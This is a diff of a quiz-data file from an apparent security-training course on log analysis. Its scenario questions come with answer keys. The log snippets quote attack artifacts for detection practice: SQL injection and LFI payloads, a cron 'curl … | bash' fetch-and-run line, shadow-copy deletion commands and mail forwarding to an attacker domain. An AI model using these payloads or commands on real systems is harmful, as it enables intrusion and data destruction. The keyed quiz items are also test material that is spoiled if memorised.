+          tags: ["sudo", "Privilege Abuse"],
+          scenario: "/var/log/auth.log:\n  Jun15 04:02 host01 sudo: jdoe : TTY=pts/1 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+          question: "Verdict?",
+          options: [
+            "Routine admin task.",
+            "Privilege abuse / credential access (T1003.008). cat /etc/shadow is rarely legitimate — preserve the file, confirm jdoe's role, check for subsequent file transfer / hashcat usage, treat as IR.",
+            "Backup operation.",
+            "Patching.",
+          ],
+          correctAnswer: 1,
+          explanation: "Reading /etc/shadow grabs hashed passwords for offline cracking. Even with sudo rights, no normal workflow needs this. Look for what jdoe did next (scp, base64, pastebin) and any new 'Accepted' SSH sessions after."
+        },
+        {
+          id: "la-q3-3",
+          difficulty: "medium",
+          tags: ["Web Logs", "Web Attacks"],
+          scenario: "Apache access.log:\n  198.51.100.4 - - [15/Jun/2026:08:14:22 +0000] \"GET /products?id=1%27%20OR%20%271%27=%271 HTTP/1.1\" 200 18422\n  198.51.100.4 - - [15/Jun/2026:08:14:23 +0000] \"GET /products?id=1%27%20UNION%20SELECT%20null,version()-- HTTP/1.1\" 200 19102\n  198.51.100.4 - - [15/Jun/2026:08:14:25 +0000] \"GET /products?id=1%27;%20SELECT%20*%20FROM%20users-- HTTP/1.1\" 200 27310",
+          question: "What attack is in progress, and what does the 200 status code tell you?",
+          options: [
+            "XSS — and 200 means it was blocked.",
+            "SQL injection (T1190). 200 = the server returned content for every payload — the app is responding, not blocking, and response sizes are GROWING (18k → 19k → 27k) which suggests data is being extracted. WAF gap.",
+            "Path traversal.",
+            "CSRF.",
+          ],
+          correctAnswer: 1,
+          explanation: "URL-decoded payloads (' OR '1'='1, UNION SELECT, ;SELECT * FROM users) = classic SQLi. 200 + growing body size is a strong indicator the queries are succeeding and exfiltrating rows. Action: block IP, enable WAF rule, code review of /products."
+        },
+        {
+          id: "la-q3-4",
+          difficulty: "medium",
+          tags: ["Firewall", "Port Scan"],
+          scenario: "Firewall syslog:\n  10.6.1.77 → 10.6.1.10:22 SYN  denied\n  10.6.1.77 → 10.6.1.10:23 SYN  denied\n  10.6.1.77 → 10.6.1.10:80 SYN  denied\n  10.6.1.77 → 10.6.1.10:443 SYN  denied\n  10.6.1.77 → 10.6.1.10:445 SYN  denied\n  ... (sequential ports 1-65535 in 12s) ...",
+          question: "What is this and what makes the source notable?",
+          options: [
+            "External scan from the internet — ignore.",
+            "Internal port scan (T1046 Network Service Discovery) from 10.6.1.77 — an internal host scanning. Investigate WHY an internal box is scanning peers; treat as possible post-compromise discovery.",
+            "Asset management tool.",
+            "Backup traffic.",
+          ],
+          correctAnswer: 1,
+          explanation: "Internal-to-internal scans are far more concerning than internet noise — they almost always mean a host is already compromised and the attacker is enumerating the segment. Confirm with asset-mgmt records before assuming malice, then isolate."
+        },
+        {
+          id: "la-q3-5",
+          difficulty: "medium",
+          tags: ["DNS", "DNS Tunneling"],
+          scenario: "DNS server query log for one client (5 min):\n  a1b2c3d4e5.exfil.attacker.tld TXT\n  f6g7h8i9j0.exfil.attacker.tld TXT\n  k1l2m3n4o5.exfil.attacker.tld TXT\n  ... 1,200 unique subdomains, all TXT, all to *.exfil.attacker.tld ...",
+          question: "What is this pattern?",
+          options: [
+            "Normal CDN behavior.",
+            "DNS tunneling / exfil (T1071.004 / T1048.003) — long random subdomains, single parent domain, TXT records carry the payload. Sinkhole the domain, isolate the client, capture the process making queries.",
+            "DNSSEC validation.",
+            "ANY-record amplification.",
+          ],
+          correctAnswer: 1,
+          explanation: "High entropy in subdomain labels + a single parent + TXT (large response capacity) is the canonical DNS-tunnel signature. Tools: dnscat2, iodine. Sinkhole the parent at the resolver; pivot to EDR for the process."
+        },
+        {
+          id: "la-q3-6",
+          difficulty: "medium",
+          tags: ["Proxy", "C2 / Beaconing"],
+          scenario: "Squid proxy log filtered for one client over 6 hours:\n  Every 60 ±3 seconds: GET http://185.234.x.x/api/poll  302  227 bytes  user-agent=curl/7.85.0",
+          question: "Interpretation?",
+          options: [
+            "Browser polling for mail.",
+            "Beaconing C2 — fixed jitter, raw IP host, tiny consistent response, non-browser UA. Block the URL, isolate the client, hunt the UA + IP fleet-wide.",
+            "Software update check.",
+            "NTP traffic.",
+          ],
+          correctAnswer: 1,
+          explanation: "Beacon traits present: regular interval with small jitter, suspicious destination (IP not domain), atypical UA (curl from a user host), tiny response body for control channel. Even on port 80/443 the timing exposes it."
+        },
+        {
+          id: "la-q3-7",
+          difficulty: "medium",
+          tags: ["Web Logs", "LFI/RCE"],
+          scenario: "Nginx access log:\n  GET /index.php?page=../../../../etc/passwd  200  3214\n  GET /index.php?page=php://filter/convert.base64-encode/resource=config  200  4011",
+          question: "What two techniques are visible?",
+          options: [
+            "Only directory listing.",
+            "Local File Inclusion (../../etc/passwd) and PHP wrapper abuse to base64-exfiltrate the config — both T1083 (File Discovery) escalating to T1005 (Data from Local System). Patch the include, restrict open_basedir, rotate any secrets in the config.",
+            "SQLi only.",
+            "SSRF only.",
+          ],
+          correctAnswer: 1,
+          explanation: "Classic LFI plus the php://filter wrapper to bypass PHP rendering and dump source/config. 200 on both = success. Any DB creds, API keys, or JWT secrets in the leaked config must be considered compromised."
+        },
+        {
+          id: "la-q3-8",
+          difficulty: "hard",
+          tags: ["Linux", "Persistence"],
+          scenario: "On a Linux web server, recent additions found by an audit:\n  /etc/cron.d/sysupd: */5 * * * * root curl -s http://185.234.x.x/s | bash\n  ~/.ssh/authorized_keys gained a new entry: ssh-rsa AAAA... attacker@op\n  /etc/systemd/system/upd.service runs /tmp/.x every boot",
+          question: "Best summary?",
+          options: [
+            "Routine system updates.",
+            "Three persistence mechanisms (T1053.003 cron, T1098.004 SSH key, T1543.002 systemd) — assume the host is fully owned, rebuild from a known-good image, rotate all credentials/keys that touched it, and hunt the C2 IP fleet-wide.",
+            "Backup configuration.",
+            "Monitoring agent.",
+          ],
+          correctAnswer: 1,
+          explanation: "Multiple independent persistence channels = the attacker assumed they'd be evicted and planted redundancy. Cleanup is not enough — rebuild. Don't forget any SSH keys this host trusted outbound, and any service tokens stored on it."
+        },
+        {
+          id: "la-q3-9",
+          difficulty: "hard",
+          tags: ["Web Logs", "Recon"],
+          scenario: "Web access log shows from a single IP:\n  GET /.git/config  404\n  GET /.env  200\n  GET /backup.zip  200\n  GET /admin/  401\n  GET /wp-login.php  404\n  GET /phpmyadmin/  404",
+          question: "What is this and which response is the WORST news?",
+          options: [
+            "Random noise — all responses non-200.",
+            "Content discovery / sensitive-file probe — the 200 on /.env (likely leaks DB creds, API keys) and on /backup.zip (likely a full source/db dump) are the critical findings; rotate everything those files exposed and restrict the web root.",
+            "DDoS attempt.",
+            "SEO crawler.",
+          ],
+          correctAnswer: 1,
+          explanation: ".env and backup archives in the web root are catastrophic exposures — they leak production secrets in plaintext. 200 means the attacker got them. Rotate every credential, key, and token in those files immediately and audit access logs for the same IP elsewhere."
+        },
+        {
+          id: "la-q3-10",
+          difficulty: "hard",
+          tags: ["Correlation", "Multi-source"],
+          scenario: "Same user, three logs, 30 seconds apart:\n  VPN: jdoe authenticated from 185.x.x.x (Country: RU)\n  Okta: jdoe MFA push approved (Country: RU)\n  Email: jdoe rule created — forward all mail to ext@attacker.tld + auto-delete",
+          question: "Verdict and priority action?",
+          options: [
+            "Legitimate travel — no action.",
+            "Account takeover + mail-forwarding exfil (T1078 + T1114.003). Kill all sessions, force credential + MFA-factor reset, remove the forwarding rule, search sent items and audit logs, notify the user out-of-band, and check what mailboxes jdoe could access.",
+            "Phishing test by IT.",
+            "MFA fatigue — ignore.",
+          ],
+          correctAnswer: 1,
+          explanation: "Foreign auth followed within seconds by a hidden forwarding rule is the signature of business-email-compromise. Removing the rule is necessary but not sufficient — the attacker may have created OAuth app grants, inbox rules at the folder level, or alternate MFA devices."
+        },
     ]
   },
   {
     quizId: "la-q4",
     courseId: "log-analysis",
-    title: "Attack Pattern Recognition",
-    description: "Identify and analyze common attack patterns in log data.",
-    passingScore: 75,
-    timeLimit: 30,
+    title: "Attack Pattern Recognition in Logs",
+    description: "Identify multi-stage attack patterns — lateral movement, beaconing, exfiltration, ransomware staging — from log evidence.",
+    passingScore: 80,
+    timeLimit: 25,
     questions: [
-      {
-        id: "la-q4-1",
-        question: "What log pattern indicates a potential brute force attack?",
-        options: [
-          "Single failed login followed by success",
-          "Multiple failed login attempts from the same source in rapid succession",
-          "Successful logins from multiple locations",
-          "Regular password changes"
-        ],
-        correctAnswer: 1,
-        explanation: "Brute force attacks show multiple rapid failed login attempts from the same source, often targeting the same or multiple accounts."
-      },
-      {
-        id: "la-q4-2",
-        question: "Which web log pattern might indicate SQL injection attempts?",
-        options: [
-          "Normal page requests",
-          "Requests containing 'SELECT', 'UNION', 'OR 1=1', or encoded SQL syntax",
-          "Static file requests",
-          "Empty user-agent strings"
-        ],
-        correctAnswer: 1,
-        explanation: "SQL injection attempts often contain SQL keywords like SELECT, UNION, OR 1=1, and encoded variations in URL parameters."
-      },
-      {
-        id: "la-q4-3",
-        question: "What does 'password spraying' look like in logs?",
-        options: [
-          "Millions of attempts on one account",
-          "Few common passwords tried across many accounts",
-          "Normal authentication patterns",
-          "Account lockouts on all accounts"
-        ],
-        correctAnswer: 1,
-        explanation: "Password spraying shows few attempts per account but across many accounts, often avoiding lockout thresholds."
-      },
-      {
-        id: "la-q4-4",
-        question: "Which pattern suggests directory traversal attack attempts?",
-        options: [
-          "Normal file paths",
-          "Paths containing '../' or '..\\' sequences",
-          "HTTPS requests",
-          "Large file uploads"
-        ],
-        correctAnswer: 1,
-        explanation: "Directory traversal attempts contain '../' or '..\\' sequences trying to access files outside the web root."
-      },
-      {
-        id: "la-q4-5",
-        question: "What might multiple 'net user' commands in Windows logs indicate?",
-        options: [
-          "Normal IT operations",
-          "User enumeration or reconnaissance by an attacker",
-          "System updates",
-          "Antivirus activity"
-        ],
-        correctAnswer: 1,
-        explanation: "Multiple 'net user' commands might indicate an attacker enumerating users for privilege escalation or lateral movement."
-      },
-      {
-        id: "la-q4-6",
-        question: "Which log entry pattern suggests potential data exfiltration?",
-        options: [
-          "Normal web browsing",
-          "Large outbound data transfers, especially to unusual destinations",
-          "Inbound email traffic",
-          "Software updates"
-        ],
-        correctAnswer: 1,
-        explanation: "Data exfiltration often shows as large outbound transfers to unusual IPs, cloud storage, or during off-hours."
-      },
-      {
-        id: "la-q4-7",
-        question: "What does a 'golden ticket' attack look like in Kerberos logs?",
-        options: [
-          "Normal ticket requests",
-          "TGS requests without corresponding TGT requests, or tickets with very long lifetimes",
-          "Password reset requests",
-          "Account lockouts"
-        ],
-        correctAnswer: 1,
-        explanation: "Golden ticket attacks may show TGS requests without AS-REQ, unusual ticket lifetimes, or tickets for non-existent users."
-      },
-      {
-        id: "la-q4-8",
-        question: "Which pattern indicates potential web shell activity?",
-        options: [
-          "Regular web page requests",
-          "POST requests to unusual files with command-like parameters",
-          "Image file requests",
-          "CSS file requests"
-        ],
-        correctAnswer: 1,
-        explanation: "Web shells often show as POST requests to unusual file paths (like .php files in unexpected locations) with command parameters."
-      },
-      {
-        id: "la-q4-9",
-        question: "What might 'scheduled task created' events combined with persistence mechanisms indicate?",
-        options: [
-          "Normal system administration",
-          "Potential malware establishing persistence",
-          "Routine maintenance",
-          "User preference changes"
-        ],
-        correctAnswer: 1,
-        explanation: "Attackers often create scheduled tasks for persistence. Combined with suspicious executables, this indicates compromise."
-      },
-      {
-        id: "la-q4-10",
-        question: "Which log pattern suggests Pass-the-Hash attacks?",
-        options: [
-          "Normal interactive logons",
-          "NTLM authentication without prior password entry, especially Type 3 logons",
-          "Kerberos ticket requests",
-          "Password changes"
-        ],
-        correctAnswer: 1,
-        explanation: "Pass-the-Hash attacks show NTLM authentications using stolen hashes, often appearing as Type 3 network logons without interactive login."
-      },
-      {
-        id: "la-q4-11",
-        question: "What does PowerShell downloading and executing code in logs suggest?",
-        options: [
-          "Normal scripting",
-          "Potential 'living off the land' attack technique",
-          "System updates",
-          "Scheduled maintenance"
-        ],
-        correctAnswer: 1,
-        explanation: "PowerShell downloading and executing code (DownloadString, IEX) is a common 'living off the land' technique used by attackers."
-      },
-      {
-        id: "la-q4-12",
-        question: "Which indicator in proxy logs might reveal C2 communication?",
-        options: [
-          "Regular HTTP GET requests",
-          "Beaconing patterns - regular, timed connections to the same domain",
-          "Large file downloads",
-          "Social media access"
-        ],
-        correctAnswer: 1,
-        explanation: "C2 beaconing shows regular, timed connections (e.g., every 60 seconds) to specific domains, often with similar payload sizes."
-      }
+        {
+          id: "la-q4-1",
+          difficulty: "medium",
+          tags: ["Lateral Movement", "SMB"],
+          scenario: "From host A (10.4.2.55) in 90 seconds:\n  10.4.2.55 → 10.4.2.10:445 SMB  Tree connect to ADMIN$\n  10.4.2.55 → 10.4.2.10:445 SMB  Write file: PSEXESVC.exe\n  10.4.2.10 EID 7045 ServiceName=PSEXESVC  ServiceFileName=%SystemRoot%\\PSEXESVC.exe\n  10.4.2.10 EID 4624 LogonType=3 Account=admin SourceNetworkAddress=10.4.2.55",
+          question: "What technique is this and what is the right containment?",
+          options: [
+            "Normal file share usage.",
+            "Lateral movement via PsExec (T1021.002 / T1569.002). Isolate both A and the target, kill the service, hunt for the admin credential source on A, and check every other host A talked to on 445.",
+            "Backup operation.",
+            "Group Policy push.",
+          ],
+          correctAnswer: 1,
+          explanation: "ADMIN$ write of PSEXESVC + a matching 7045 + a 4624 Type 3 with admin creds = PsExec lateral movement. Critical question is HOW host A got admin creds (LSASS dump? Mimikatz? cached creds?) — that's the real start of the chain."
+        },
+        {
+          id: "la-q4-2",
+          difficulty: "medium",
+          tags: ["Beaconing", "Timing Analysis"],
+          scenario: "Proxy log for one workstation, plotted by minute:\n  Connections to a single external host arrive at 00, 60, 120, 180 ... seconds with ±3s jitter, 24h continuous, 24-byte payloads.",
+          question: "Strongest single indicator that this is C2 beaconing rather than legitimate polling?",
+          options: [
+            "The destination is HTTPS.",
+            "The combination of fixed interval, tiny payload, and 24h continuity with no human-driven variance — legitimate polling has gaps (sleep, lunch, weekends) and variable payloads.",
+            "It's port 443.",
+            "The host is a Mac.",
+          ],
+          correctAnswer: 1,
+          explanation: "Humans create natural gaps; software beacons don't. Continuous 24h periodicity with tiny payloads is the timing fingerprint of C2 (Cobalt Strike, Sliver, Empire). Pair with destination-reputation and JA3 for high confidence."
+        },
+        {
+          id: "la-q4-3",
+          difficulty: "medium",
+          tags: ["Exfiltration", "DLP"],
+          scenario: "Egress sensor:\n  Host 10.5.6.7 → drive.attacker.tld over 4h transferred 14 GB outbound\n  Same host shows 100MB/day average for the previous 30 days",
+          question: "Best characterization?",
+          options: [
+            "Backup misconfiguration.",
+            "Data exfiltration (T1048 / T1567) — 140× baseline egress to a new destination. Isolate, identify the user/process, snapshot the host, notify legal/IR, and determine WHAT data the host could access.",
+            "Software update.",
+            "Cloud sync — benign.",
+          ],
+          correctAnswer: 1,
+          explanation: "Baselines are king. 140× normal egress + new external destination is a near-certain exfil. The follow-up question — 'what could that host reach?' — drives the breach scope and any required disclosures."
+        },
+        {
+          id: "la-q4-4",
+          difficulty: "medium",
+          tags: ["Ransomware", "Staging"],
+          scenario: "EDR + file telemetry on a file server in 6 minutes:\n  vssadmin delete shadows /all /quiet\n  wbadmin delete catalog -quiet\n  bcdedit /set {default} recoveryenabled No\n  Followed by mass file renames: *.docx → *.docx.<random>",
+          question: "What stage of what attack is this?",
+          options: [
+            "Routine backup cleanup.",
+            "Ransomware staging + encryption (T1490 Inhibit System Recovery + T1486 Data Encrypted for Impact). Isolate the file server NOW, fail over to last clean backup, pull the encryptor binary for IR.",
+            "Disk defrag.",
+            "OS upgrade.",
+          ],
+          correctAnswer: 1,
+          explanation: "Shadow-copy deletion + boot-config tamper + mass rename to random extensions is the canonical pre-encryption + encryption sequence. Speed matters — every minute is more files lost. The encryptor is usually still resident; capture it before reboot."
+        },
+        {
+          id: "la-q4-5",
+          difficulty: "medium",
+          tags: ["Credential Theft", "LSASS"],
+          scenario: "Sysmon Event ID 10 (process access):\n  SourceImage=C:\\Users\\jdoe\\AppData\\Local\\Temp\\proc.exe\n  TargetImage=C:\\Windows\\System32\\lsass.exe\n  GrantedAccess=0x1410",
+          question: "Interpretation?",
+          options: [
+            "Routine antivirus scan.",
+            "Credential dumping attempt against LSASS (T1003.001). 0x1410 includes PROCESS_VM_READ — the binary is trying to read LSASS memory (Mimikatz / procdump style). Isolate, capture proc.exe, force a credential rotation for anyone logged on.",
+            "Windows Update.",
+            "EDR self-protection.",
+          ],
+          correctAnswer: 1,
+          explanation: "Non-EDR process touching LSASS with VM_READ is one of the highest-confidence credential-theft signals. Anyone whose session was active on that host must rotate creds, and any service tickets the host held are suspect."
+        },
+        {
+          id: "la-q4-6",
+          difficulty: "hard",
+          tags: ["Living Off the Land", "Discovery"],
+          scenario: "On a freshly compromised workstation, in the first 8 minutes:\n  whoami /all\n  net user /domain\n  net group \"Domain Admins\" /domain\n  nltest /dclist:corp.local\n  ipconfig /all\n  arp -a\n  tasklist /svc\n  systeminfo",
+          question: "What stage and what tools?",
+          options: [
+            "Routine helpdesk diagnostics.",
+            "Post-exploitation discovery (T1087 Account Discovery, T1018 Remote System Discovery, T1082 System Information Discovery) using only native binaries — Living-Off-the-Land. No malware needed, no AV alert. Detect by sequence/burst behavior, not by binary reputation.",
+            "Phishing payload.",
+            "Backup script.",
+          ],
+          correctAnswer: 1,
+          explanation: "Each command alone is benign — admins run them. The TELL is that they're all run in seconds, by the same user, on a workstation that never normally does this. Detection rule: 5+ discovery commands within 2 minutes by a non-admin → alert."
+        },
+        {
+          id: "la-q4-7",
+          difficulty: "hard",
+          tags: ["Persistence", "Scheduled Task"],
+          scenario: "EID 4698 (scheduled task created):\n  TaskName=\\Microsoft\\Windows\\AppCompat\\PolicyConverter\n  TaskContent=...<Exec><Command>powershell.exe</Command><Arguments>-w hidden -enc JABzAD0A...</Arguments></Exec>...\n  Trigger: <LogonTrigger>",
+          question: "Why is the task name notable, and what is this?",
+          options: [
+            "Microsoft installed it — ignore.",
+            "Persistence via Scheduled Task (T1053.005). The name impersonates a real Microsoft task path (defense evasion / masquerading T1036.005). Logon-triggered encoded PowerShell — disable the task, capture the encoded payload, hunt the task name pattern fleet-wide.",
+            "Driver update.",
+            "Group Policy.",
+          ],
+          correctAnswer: 1,
+          explanation: "Attackers love task names under \\Microsoft\\Windows\\... because hurried analysts assume they're legit. Always validate against a clean baseline of Microsoft-shipped tasks and decode any encoded PowerShell payload."
+        },
+        {
+          id: "la-q4-8",
+          difficulty: "hard",
+          tags: ["Cloud", "IAM Abuse"],
+          scenario: "AWS CloudTrail in 4 minutes:\n  CreateAccessKey  user=Alice  by=Alice\n  PutUserPolicy  user=Alice  policy={\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}\n  AssumeRole  role=OrgAdmin  source=185.x.x.x (new IP, new region)",
+          question: "What happened?",
+          options: [
+            "Normal admin work.",
+            "Cloud account takeover / privilege escalation (T1078.004 + T1098.001) — new access key, self-granted * permissions, role assumption from a new geography. Disable the user, revoke keys, audit every action that key took, rotate any secrets it could read.",
+            "AWS internal maintenance.",
+            "MFA enrollment.",
+          ],
+          correctAnswer: 1,
+          explanation: "Key creation + self-applied admin-equivalent policy + new-geo AssumeRole is a classic cloud-compromise chain. The blast radius is whatever * allowed — assume worst case until proven otherwise. CloudTrail + S3 data events + GuardDuty are the pivot points."
+        },
+        {
+          id: "la-q4-9",
+          difficulty: "hard",
+          tags: ["Phishing", "Initial Access"],
+          scenario: "Mail gateway → EDR chain in 90 seconds:\n  Mail: from=hr@partner-co.tld  subject='Updated invoice'  attachment=invoice.html (HTML smuggling)\n  Browser: user opens invoice.html which writes setup.iso to Downloads\n  Mount: setup.iso mounted as E:\\ — contains shortcut.lnk + hidden script.bat\n  Process: explorer.exe → wscript.exe E:\\script.bat → powershell -enc ...",
+          question: "Best classification of the initial access technique?",
+          options: [
+            "Drive-by download.",
+            "Phishing with HTML smuggling + ISO container (T1566.001 / T1027.006). The ISO bypasses Mark-of-the-Web on older Windows, hiding the LNK→script chain. Block the sender, hunt the ISO hash, kill the PowerShell, and consider a fleet rule that flags ISO mounts from user Downloads.",
+            "Watering hole.",
+            "Supply chain.",
+          ],
+          correctAnswer: 1,
+          explanation: "HTML-smuggling delivery + ISO/IMG container is the dominant 2023-2025 initial-access pattern (Qakbot, BumbleBee, IcedID). Detection requires correlating mail → browser write → mount → script execution, which is why mail-only or EDR-only views miss it."
+        },
+        {
+          id: "la-q4-10",
+          difficulty: "hard",
+          tags: ["Kill Chain", "Storytelling"],
+          scenario: "Reviewing 14 days of logs after detection, you assemble:\n  Day 1: phishing email with macro (T1566.001)\n  Day 1: macro runs PowerShell, beacons to 185.x.x.x (T1059.001 + T1071)\n  Day 3: Mimikatz on workstation (T1003.001)\n  Day 5: PsExec to fileserver (T1021.002)\n  Day 7: scheduled task persistence on 4 hosts (T1053.005)\n  Day 12: vssadmin delete + mass file encryption (T1490 + T1486)",
+          question: "Which artifact is the highest-priority root-cause finding for the post-incident report?",
+          options: [
+            "The encryption event on Day 12.",
+            "The phishing email on Day 1 — the initial access vector. Everything else is downstream; fixing macro execution policy + user training + better mail filtering breaks future intrusions earlier. Day 12 is the impact, not the cause.",
+            "The PsExec event on Day 5.",
+            "The scheduled task on Day 7.",
+          ],
+          correctAnswer: 1,
+          explanation: "Post-incident reports drive prevention investment. The initial access vector (Day 1 phishing macro) is the single highest-leverage control point — block it and the rest of the chain never starts. The other events inform detection improvements, not prevention."
+        },
     ]
   },
   {
     quizId: "la-q5",
     courseId: "log-analysis",
-    title: "Log Analysis Tools & Best Practices",
-    description: "Master essential tools, techniques, and best practices for effective log analysis.",
-    passingScore: 70,
-    timeLimit: 20,
+    title: "Log Analysis Tools, Queries & Best Practices",
+    description: "CLI triage (grep/awk/jq), Splunk SPL, ELK KQL, and operational best practices for production log analysis.",
+    passingScore: 80,
+    timeLimit: 25,
     questions: [
-      {
-        id: "la-q5-1",
-        question: "Which Linux command is best for searching text patterns in log files?",
-        options: [
-          "ls",
-          "grep",
-          "cd",
-          "mkdir"
-        ],
-        correctAnswer: 1,
-        explanation: "The 'grep' command is essential for searching text patterns in files. It supports regex for complex pattern matching."
-      },
-      {
-        id: "la-q5-2",
-        question: "What does the command 'grep -i \"failed\" /var/log/auth.log' do?",
-        options: [
-          "Deletes lines containing 'failed'",
-          "Searches case-insensitively for 'failed' in auth.log",
-          "Creates a file called 'failed'",
-          "Counts the lines in auth.log"
-        ],
-        correctAnswer: 1,
-        explanation: "grep -i performs a case-insensitive search for the pattern 'failed' in the auth.log file."
-      },
-      {
-        id: "la-q5-3",
-        question: "Which command would count the number of failed SSH attempts?",
-        options: [
-          "cat /var/log/auth.log",
-          "grep -c 'Failed password' /var/log/auth.log",
-          "tail /var/log/auth.log",
-          "head /var/log/auth.log"
-        ],
-        correctAnswer: 1,
-        explanation: "grep -c counts the number of lines matching the pattern. This counts how many failed password entries exist."
-      },
-      {
-        id: "la-q5-4",
-        question: "What is the purpose of log normalization?",
-        options: [
-          "To delete old logs",
-          "To convert different log formats into a consistent, standard format",
-          "To encrypt log files",
-          "To compress log storage"
-        ],
-        correctAnswer: 1,
-        explanation: "Log normalization converts diverse log formats into a consistent structure, enabling correlation and unified analysis."
-      },
-      {
-        id: "la-q5-5",
-        question: "Why is establishing a baseline important in log analysis?",
-        options: [
-          "To increase storage space",
-          "To understand normal behavior so anomalies can be detected",
-          "To delete old logs automatically",
-          "To encrypt sensitive data"
-        ],
-        correctAnswer: 1,
-        explanation: "Baselines define normal behavior patterns. Deviations from baselines help identify anomalies and potential security incidents."
-      },
-      {
-        id: "la-q5-6",
-        question: "What command combines 'sort' and 'uniq -c' for log analysis?",
-        options: [
-          "Counts unique occurrences of sorted lines",
-          "Deletes duplicate lines",
-          "Encrypts the output",
-          "Compresses the file"
-        ],
-        correctAnswer: 0,
-        explanation: "Piping through 'sort | uniq -c' sorts lines and counts unique occurrences - useful for finding top talkers or common events."
-      },
-      {
-        id: "la-q5-7",
-        question: "What is log correlation?",
-        options: [
-          "Deleting related logs",
-          "Connecting events from multiple sources to identify patterns",
-          "Copying logs to backup",
-          "Compressing log files"
-        ],
-        correctAnswer: 1,
-        explanation: "Log correlation connects events from multiple sources to identify relationships, patterns, and reconstruct attack timelines."
-      },
-      {
-        id: "la-q5-8",
-        question: "Which regex pattern would match an IPv4 address?",
-        options: [
-          "[a-z]+",
-          "[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}",
-          "[A-Z]*",
-          "\\s+"
-        ],
-        correctAnswer: 1,
-        explanation: "The pattern [0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3} matches IPv4 addresses (groups of 1-3 digits separated by dots)."
-      },
-      {
-        id: "la-q5-9",
-        question: "What should be included in a log analysis report?",
-        options: [
-          "Only the analyst's name",
-          "Executive summary, timeline, findings, evidence, and recommendations",
-          "Raw logs only",
-          "System specifications"
-        ],
-        correctAnswer: 1,
-        explanation: "A complete log analysis report includes executive summary, timeline of events, detailed findings, evidence, and actionable recommendations."
-      },
-      {
-        id: "la-q5-10",
-        question: "What is the 'awk' command commonly used for in log analysis?",
-        options: [
-          "Compressing files",
-          "Text processing and extracting specific fields from structured data",
-          "Network scanning",
-          "File encryption"
-        ],
-        correctAnswer: 1,
-        explanation: "awk is powerful for text processing, particularly extracting and manipulating specific fields from structured log data."
-      },
-      {
-        id: "la-q5-11",
-        question: "Why should log analysis findings be documented with timestamps?",
-        options: [
-          "For aesthetic purposes",
-          "To establish timeline accuracy and enable recreation of events",
-          "To increase file size",
-          "For alphabetical ordering"
-        ],
-        correctAnswer: 1,
-        explanation: "Timestamps establish timeline accuracy, enable event recreation, and provide audit trails for incident response and legal proceedings."
-      },
-      {
-        id: "la-q5-12",
-        question: "What is the benefit of using a SIEM for log analysis?",
-        options: [
-          "It replaces all other security tools",
-          "It provides centralized collection, correlation, alerting, and visualization",
-          "It eliminates the need for analysts",
-          "It automatically fixes security issues"
-        ],
-        correctAnswer: 1,
-        explanation: "SIEMs provide centralized log collection, real-time correlation, alerting, dashboards, and long-term storage for efficient analysis."
-      }
+        {
+          id: "la-q5-1",
+          difficulty: "easy",
+          tags: ["CLI", "grep/awk"],
+          scenario: "On a Linux box (no SIEM access), you need the top 10 source IPs by failed-SSH count from /var/log/auth.log over 1M lines.",
+          question: "Which pipeline is correct and idiomatic?",
+          options: [
+            "cat auth.log | wc -l",
+            "grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10",
+            "tail -f auth.log",
+            "cp auth.log /tmp/",
+          ],
+          correctAnswer: 1,
+          explanation: "Standard CLI triage: filter (grep) → extract field (awk; $(NF-3) is the source IP in the default sshd Failed-password format) → count (sort | uniq -c) → rank (sort -rn) → top N (head). Works on any UNIX without extra tooling."
+        },
+        {
+          id: "la-q5-2",
+          difficulty: "easy",
+          tags: ["jq", "JSON"],
+          scenario: "An EDR streams JSON one-per-line. You want the count of unique processes (process.name) where event.action='process_create' in the last 100k lines of /var/log/edr.json.",
+          question: "Best jq pipeline?",
+          options: [
+            "jq '.process'",
+            "tail -n 100000 /var/log/edr.json | jq -r 'select(.event.action==\"process_create\") | .process.name' | sort -u | wc -l",
+            "cat /var/log/edr.json | grep process",
+            "awk '{print $1}' /var/log/edr.json",
+          ],
+          correctAnswer: 1,
+          explanation: "jq -r 'select(...) | .field' is the canonical way to filter + project structured JSON. Always tail-bound to keep one-shot triage fast on multi-GB files."
+        },
+        {
+          id: "la-q5-3",
+          difficulty: "medium",
+          tags: ["Splunk SPL", "Detection"],
+          scenario: "You need a Splunk search that returns users with ≥5 failed logins followed by 1+ success within 10 minutes from the same source IP.",
+          question: "Which structure is correct?",
+          options: [
+            "index=auth | stats count",
+            "index=auth EventCode IN (4624,4625) | stats count(eval(EventCode=4625)) AS fails count(eval(EventCode=4624)) AS success values(EventCode) AS codes by user, src_ip, _time span=10m | where fails>=5 AND success>=1",
+            "index=auth | sort _time",
+            "index=auth | dedup user",
+          ],
+          correctAnswer: 1,
+          explanation: "The eval-inside-stats pattern is the standard SPL way to count conditionally across event types. span=10m bins time; by user+src_ip groups the triage unit. The where clause is the alert condition. The other answers don't express the multi-condition correlation."
+        },
+        {
+          id: "la-q5-4",
+          difficulty: "medium",
+          tags: ["KQL", "Detection"],
+          scenario: "Microsoft Sentinel / Defender KQL: 'lsass.exe accessed by a non-Microsoft-signed process in the last 24h'.",
+          question: "Which query best matches?",
+          options: [
+            "SecurityEvent | take 10",
+            "DeviceProcessEvents | where Timestamp > ago(24h) | where InitiatingProcessFileName !endswith \".exe\" or InitiatingProcessSignatureStatus != \"Signed\" | join DeviceEvents on $left.DeviceId == $right.DeviceId | where ActionType == \"OpenProcess\" and FileName =~ \"lsass.exe\"",
+            "SigninLogs | summarize count()",
+            "Heartbeat | where TimeGenerated > ago(24h)",
+          ],
+          correctAnswer: 1,
+          explanation: "Approximate, but it shows the correct pattern: time bound + signature filter on the initiator + join on device + the lsass target. Real prod rules add allowlists for EDR/AV agents. The other answers don't touch process telemetry."
+        },
+        {
+          id: "la-q5-5",
+          difficulty: "medium",
+          tags: ["Best Practice", "Parsing"],
+          scenario: "A vendor pushes a major log-format change in the next maintenance window. Your detections rely on extracted fields.",
+          question: "Lowest-risk way to handle this?",
+          options: [
+            "Apply the change in prod over the weekend and hope for the best.",
+            "Ingest the new format to a test/dev SIEM tier first, validate every affected parser + detection, then promote — keep the old parser as a fallback for the rolling cutover window.",
+            "Pause all logging during the change.",
+            "Delete all old detections.",
+          ],
